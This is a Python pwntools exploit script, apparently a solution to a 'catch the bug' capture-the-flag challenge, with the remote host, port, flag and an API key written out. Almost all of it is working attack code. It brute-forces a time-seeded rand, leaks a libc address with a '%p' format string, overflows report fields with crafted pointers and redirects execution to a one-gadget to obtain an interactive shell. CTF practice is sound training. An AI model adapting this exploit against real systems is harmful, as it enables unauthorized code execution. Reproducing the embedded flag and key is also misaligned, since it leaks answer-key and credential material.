from pwn import *
from ctypes import *
import sys
# flag : SCTF{Y0u_4r3_7h3_3xp3r7_0f_BUGS!}
HOST = "catchthebug.eatpwnnosleep.com"
PORT = 55555
REMOTE = 0
context.log_level = 'debug'
import json
a = {
    'apikey' : "a7d4eeae97f394fc427ebfac74e8158c9aa578136716cc72e081edce445ba3e2",
}
if(REMOTE):
  	s = remote(HOST,PORT)
else:
  	s = remote(HOST,PORT)
clib = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc-2.23.so")
clib.srand(clib.time(0))
rand = [ clib.rand()&3 for i in range(3) ]
while not rand == [0,0,0]:
	s.close()
	s = remote(HOST,PORT)
	clib = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc-2.23.so")
	clib.srand(clib.time(0))
	rand = [ clib.rand()&3 for i in range(3) ]
def catch_bug(name):
	s.recvuntil('>>')
	s.sendline('1')
	s.recvuntil('>>')
	s.send(name)

catch_bug("%p\n")
offset1 = 0x5ff4f0 + 0x3c00 + 0x100*0x14
offset2 = 0x3dbd58
s.recvuntil('>>')
s.sendline('2')
s.recvuntil('=========================\n')
libc = int(s.recv(2*6+2),16) - 0x3db7a3
print hex(libc)
catch_bug('A\n')

catch_bug('A\n')

s.recvuntil('>>')
s.sendline('3')
s.recvuntil('Report title')
s.send("A"*0x40)
s.recvuntil('Report subtitle')
s.send("A"*0x80)

dat = "A"*0x36
dat += p64(libc+offset2-0x36-8-9)
dat += p64(libc+offset1)

s.recvuntil('Report body')
s.sendline(dat)
s.recvuntil('Report tag')
s.send(p64(0x0))
s.recvuntil('Report password')
s.send(p64(libc+0x0FDB9A))
s.interactive()
